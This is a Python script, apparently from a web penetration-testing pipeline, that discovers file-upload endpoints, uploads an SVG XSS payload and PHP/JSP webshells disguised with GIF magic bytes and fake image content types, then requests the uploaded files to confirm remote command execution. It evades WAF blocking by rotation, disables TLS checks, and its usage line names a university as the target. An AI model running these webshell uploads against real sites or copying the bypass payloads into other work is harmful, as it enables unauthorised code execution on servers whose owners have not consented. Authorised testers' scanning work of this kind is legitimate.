# TOOLS/pipeline/upload_scan.py
"""文件上传利用：发现上传端点，测试 SVG/PHP/JSP webshell 上传，验证执行。

用法:
  uv run python TOOLS/pipeline/upload_scan.py --target "台州学院"

输出:
  [UPLOAD_SCAN] targets={n} tested={m} found={k}
"""

from __future__ import annotations

import argparse
import json
import re
import sqlite3
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests
import urllib3

urllib3.disable_warnings()

_TOOLS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_TOOLS))

from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect, find_db  # noqa: E402
from utils.waf_rotate import RotatingFetcher  # noqa: E402

BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

UPLOAD_PATH_RE = re.compile(
    r"/(?:upload|file|attach|avatar|import|image|photo|media|resource|assets|static/upload)",
    re.IGNORECASE,
)

# GIF89a magic bytes + PHP payload（bypass 简单 MIME 检测）
_GIF_MAGIC = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
    b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)

SVG_XSS_DATA = (
    b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'><circle r='50' cx='50' cy='50'/></svg>"
)
PHP_WEBSHELL_DATA = _GIF_MAGIC + b'<?php echo shell_exec("ls /"); ?>'
JSP_WEBSHELL_DATA = (
    b'<%@ page import="java.util.*,java.io.*"%>'
    b'<%Process p=Runtime.getRuntime().exec("ls /");'
    b"OutputStream os=response.getOutputStream();"
    b"byte b[]=new byte[4096];int len;"
    b"while((len=p.getInputStream().read(b))!=-1){os.write(b,0,len);}%>"
)

_LS_ROOT_DIRS = frozenset(
    {"bin", "boot", "dev", "etc", "home", "lib", "opt", "proc", "root", "srv", "tmp", "usr", "var"}
)

_URL_FIELDS = (
    "url",
    "path",
    "src",
    "file",
    "fileUrl",
    "file_url",
    "filePath",
    "file_path",
    "link",
    "href",
    "location",
    "uri",
)

_URL_PATTERN_IN_BODY = re.compile(r'["\']([/][^"\'<>\s]{3,200}\.[a-zA-Z0-9]{1,10})["\']')


def build_payloads() -> dict[str, dict]:
    """返回 {payload_name: {filename, content_type, data}}。"""
    uid = uuid.uuid4().hex[:8]
    return {
        "svg_xss": {
            "filename": f"test_{uid}.svg",
            "content_type": "image/svg+xml",
            "data": SVG_XSS_DATA,
        },
        "php_webshell": {
            "filename": f"test_{uid}.php",
            "content_type": "image/gif",
            "data": PHP_WEBSHELL_DATA,
        },
        "php_jpg": {
            "filename": f"test_{uid}.php.jpg",
            "content_type": "image/jpeg",
            "data": PHP_WEBSHELL_DATA,
        },
        "jsp_webshell": {
            "filename": f"test_{uid}.jsp",
            "content_type": "text/plain",
            "data": JSP_WEBSHELL_DATA,
        },
    }


def find_upload_targets(conn: sqlite3.Connection) -> list[dict]:
    """从 forms_json + URL 模式发现上传端点。"""
    targets: list[dict] = []
    seen: set[str] = set()

    rows = conn.execute(
        "SELECT url, forms_json FROM pages WHERE forms_json IS NOT NULL AND status='visited'"
    ).fetchall()
    for row in rows:
        page_url = row[0] if isinstance(row, tuple) else row["url"]
        forms_raw = row[1] if isinstance(row, tuple) else row["forms_json"]
        if not forms_raw:
            continue
        try:
            forms = json.loads(forms_raw)
        except (json.JSONDecodeError, TypeError):
            continue
        for form in forms:
            inputs = form.get("inputs", [])
            file_inputs = [i for i in inputs if i.get("type", "").lower() == "file"]
            if not file_inputs:
                continue
            action = form.get("action", page_url) or page_url
            field_name = file_inputs[0].get("name") or "file"
            if action not in seen:
                seen.add(action)
                targets.append(
                    {
                        "upload_url": action,
                        "field_name": field_name,
                        "page_url": page_url,
                        "source": "form",
                    }
                )

    rows2 = conn.execute("SELECT url FROM pages WHERE status='visited'").fetchall()
    for row in rows2:
        page_url = row[0] if isinstance(row, tuple) else row["url"]
        if not page_url:
            continue
        parsed = urlparse(page_url)
        if UPLOAD_PATH_RE.search(parsed.path):
            if page_url not in seen:
                seen.add(page_url)
                targets.append(
                    {
                        "upload_url": page_url,
                        "field_name": "file",
                        "page_url": page_url,
                        "source": "url_pattern",
                    }
                )

    return targets


def is_webshell_output(body: str) -> bool:
    """True if body looks like output of 'ls /'."""
    lines = {line.strip().lower() for line in body.splitlines() if line.strip()}
    hits = lines & {d.lower() for d in _LS_ROOT_DIRS}
    return len(hits) >= 3


def extract_uploaded_url(response_body: str, base_url: str) -> str | None:
    """Try to extract the uploaded file URL from a JSON or HTML response."""
    try:
        data = json.loads(response_body)

        def _search(obj: object) -> str | None:
            if isinstance(obj, dict):
                for field in _URL_FIELDS:
                    val = obj.get(field)
                    if isinstance(val, str) and val.startswith("/"):
                        return urljoin(base_url, val)
                    if isinstance(val, str) and val.startswith("http"):
                        return val
                for v in obj.values():
                    result = _search(v)
                    if result:
                        return result
            elif isinstance(obj, list):
                for item in obj:
                    result = _search(item)
                    if result:
                        return result
            return None

        found = _search(data)
        if found:
            return found
    except (json.JSONDecodeError, AttributeError):
        pass

    m = _URL_PATTERN_IN_BODY.search(response_body)
    if m:
        path = m.group(1)
        return urljoin(base_url, path)
    return None


def upload_file(
    upload_url: str,
    field_name: str,
    filename: str,
    content_type: str,
    data: bytes,
    cookie: str | None,
    fetcher: RotatingFetcher,
    delay: float,
) -> tuple[int, str]:
    """POST multipart upload; returns (status_code, response_body)."""
    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _post() -> requests.Response:
        return requests.post(  # noqa: S113
            upload_url,
            headers=headers,
            files={field_name: (filename, data, content_type)},
            proxies=BURP_PROXY,
            timeout=15,
            verify=False,  # noqa: S501
        )

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_post)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.status_code, resp.text[:8192]
    except Exception as exc:  # noqa: BLE001
        print(f"  [warn] upload failed: {exc}", file=sys.stderr)
    time.sleep(delay)
    return 0, ""


def write_finding(
    conn: sqlite3.Connection,
    target_id: int,
    upload_url: str,
    field_name: str,
    payload_name: str,
    evidence: str,
    risk: str,
) -> str:
    """写入 findings 表，返回 finding id。"""
    fid = f"F-UP-{uuid.uuid4().hex[:8]}"
    try:
        conn.execute(
            """INSERT OR IGNORE INTO findings
               (id, target_id, type, url, param, method, payload, evidence, risk,
                remediation, confirmed_at)
               VALUES (?, ?, 'file_upload', ?, ?, 'POST', ?, ?, ?,
                       '校验文件类型/禁止执行上传目录', ?)""",
            (
                fid,
                target_id,
                upload_url,
                field_name,
                payload_name,
                evidence,
                risk,
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            ),
        )
        conn.commit()
    except sqlite3.Error as e:
        print(f"  [warn] findings 写入失败: {e}", file=sys.stderr)
    return fid


def write_upload_sp(
    conn: sqlite3.Connection,
    upload_url: str,
    field_name: str,
    payload_name: str,
    evidence: str,
    risk: str,
) -> bool:
    """写入 suspicious_points，返回是否新插入。"""
    sp_id = f"SP-UP-{uuid.uuid4().hex[:8]}"
    try:
        cursor = conn.execute(
            """INSERT OR IGNORE INTO suspicious_points
               (id, url, param, method, test_type, evidence, source, reasoning,
                risk, test_status, created_at)
               VALUES (?, ?, ?, 'POST', 'file_upload', ?, 'upload_scan', ?, ?, 'untested', ?)""",
            (
                sp_id,
                upload_url,
                field_name,
                evidence,
                f"上传 {payload_name} 成功，需人工确认执行",
                risk,
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            ),
        )
        conn.commit()
        return cursor.rowcount > 0
    except sqlite3.Error as e:
        print(f"  [warn] suspicious_points 写入失败: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="文件上传利用扫描")
    parser.add_argument("--target", required=True)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--max-rotations", type=int, default=3, dest="max_rotations")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    row = conn.execute("SELECT seed_url FROM scan_state WHERE id=1").fetchone()
    seed_url = row["seed_url"] if row else None
    if not seed_url:
        print("[error] 无 seed_url", file=sys.stderr)
        conn.close()
        sys.exit(1)

    parsed_seed = urlparse(seed_url)
    base_url = f"{parsed_seed.scheme}://{parsed_seed.netloc}"

    target_row = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()
    target_id: int = target_row["id"] if target_row else 1

    cookie = get_auth_cookie_header(str(db_path), seed_url, role="primary")
    upload_targets = find_upload_targets(conn)
    print(f"[upload_scan] 目标: {len(upload_targets)} 个上传端点  delay={args.delay}s")

    fetcher = RotatingFetcher(max_rotations=args.max_rotations, rotate_delay=30.0)
    found = 0
    tested = 0

    for target in upload_targets:
        payloads = build_payloads()
        for pname, pinfo in payloads.items():
            status, body = upload_file(
                target["upload_url"],
                target["field_name"],
                pinfo["filename"],
                pinfo["content_type"],
                pinfo["data"],
                cookie,
                fetcher,
                args.delay,
            )
            tested += 1
            if status not in (200, 201):
                continue

            file_url = extract_uploaded_url(body, base_url)
            evidence = f"payload={pname} status={status} file_url={file_url}"

            if file_url and pname in ("php_webshell", "php_jpg", "jsp_webshell"):
                try:
                    vresp = requests.get(  # noqa: S113
                        file_url,
                        proxies=BURP_PROXY,
                        timeout=10,
                        verify=False,  # noqa: S501
                        headers={"User-Agent": "Mozilla/5.0"},
                    )
                    time.sleep(args.delay)
                    if is_webshell_output(vresp.text):
                        evidence += f" EXECUTED: {vresp.text[:200]}"
                        write_finding(
                            conn,
                            target_id,
                            target["upload_url"],
                            target["field_name"],
                            pname,
                            evidence,
                            "Critical",
                        )
                        print(f"  [!!!] Critical RCE via upload: {file_url}")
                        found += 1
                        break
                except Exception as exc:  # noqa: BLE001
                    print(f"  [warn] verify failed: {exc}", file=sys.stderr)

            if pname == "svg_xss" and file_url:
                evidence += " SVG accessible"
                write_upload_sp(conn, target["upload_url"], target["field_name"], pname, evidence, "High")
                print(f"  [ ! ] SVG upload success: {file_url}")
                found += 1
                break

    conn.close()
    print(f"\n[UPLOAD_SCAN] targets={len(upload_targets)} tested={tested} found={found}")


if __name__ == "__main__":
    main()
